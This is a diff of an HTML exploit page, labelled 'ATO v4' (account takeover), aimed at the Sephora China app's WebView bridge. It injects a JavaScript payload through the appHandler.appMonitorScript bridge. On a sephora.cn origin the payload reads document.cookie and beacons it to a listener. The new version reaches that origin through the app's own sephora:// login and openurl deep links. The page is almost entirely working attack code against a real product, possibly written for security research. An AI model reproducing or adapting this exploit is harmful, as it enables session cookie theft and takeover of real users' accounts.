@@ -1,7 +1,7 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATO-v3</title></head>
+<title>ATO-v4</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
-<h3 style="color:#c9a96e">ATO v3 (302 in-place)</h3>
+<h3 style="color:#c9a96e">ATO v4 (in-place via login route)</h3>
 <div id="log"></div>
 <script>
 window.sep = {};
@@ -15,9 +15,7 @@ function beacon(tag, extra){
     '&d=' + encodeURIComponent(extra || '').substring(0, 600);
 }
 
-// WIN: sephora源 → 偷cookie + 页面上大字横幅(肉眼可见的证明) + beacon
-// MISS: 记录origin + 重新arm (若页面还活着)
-window.__p = "0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 14px monospace;word-break:break-all';d.textContent='ATO-WIN cookies('+c.length+'): '+c.substring(0,180);document.body.appendChild(d);}catch(e){}return;}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=sweep'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<60){try{appHandler.appMonitorScript('getGPS',window.__p,'{}');}catch(e){}}})();//";
+window.__p = "0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 14px monospace;word-break:break-all';d.textContent='ATO-WIN cookies('+c.length+'): '+c.substring(0,180);document.body.appendChild(d);}catch(e){}return;}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=sweep'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<80){try{appHandler.appMonitorScript('getGPS',window.__p,'{}');}catch(e){}}})();//";
 
 beacon('page-load', location.href);
 L('page: ' + location.href);
@@ -28,7 +26,6 @@ if (typeof appHandler === 'undefined') {
   L('bridge OK');
   beacon('bridge-ok','');
 
-  // 载体: GPS 扫雷(持续) + shareApp(任意交互触发)
   appHandler.appMonitorScript('getGPS', window.__p, '{}');
   appHandler.appMonitorScript('shareApp', window.__p,
     '{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
@@ -37,15 +34,22 @@ if (typeof appHandler === 'undefined') {
   var hb = 0;
   setInterval(function(){ beacon('hb',''+(++hb)); }, 2000);
 
-  // t=4s: 302重定向导航 (绕过老签名shouldOverrideUrlLoading → 原地加载)
-  setTimeout(function() {
-    L('nav via 302 ...');
-    beacon('nav-start','');
-    // 先补几发arm (nav后JS死,靠Java侧pending回调命中新页面)
+  // t=4s: 用App自己的login路由原地导航 (redirect extra → shouldOverrideUrlLoading 原地分支)
+  function tryNav(tag, dl) {
+    beacon('nav-'+tag, dl.substring(0, 120));
+    L('nav ' + tag + ': ' + dl);
     for (var i = 0; i < 5; i++) {
       try { appHandler.appMonitorScript('getGPS', window.__p, '{}'); } catch(e){}
     }
-    location.href = 'http://127.0.0.1:8899/r302';
-  }, 4000);
+    location.href = dl;
+  }
+  setTimeout(function(){ tryNav('login-route',
+    'sephora://foundation/login?historyLocation=' + encodeURIComponent('https://m.sephora.cn/')); }, 4000);
+
+  // 若 t=10s 页面还活着(导航失败) → 依次尝试备选
+  setTimeout(function(){ tryNav('alt-host',
+    'sephora://account/login?historyLocation=' + encodeURIComponent('https://m.sephora.cn/')); }, 10000);
+  setTimeout(function(){ tryNav('openurl',
+    'sephora://openurl?url=' + encodeURIComponent('https://m.sephora.cn/')); }, 16000);
 }
 </script></body></html>
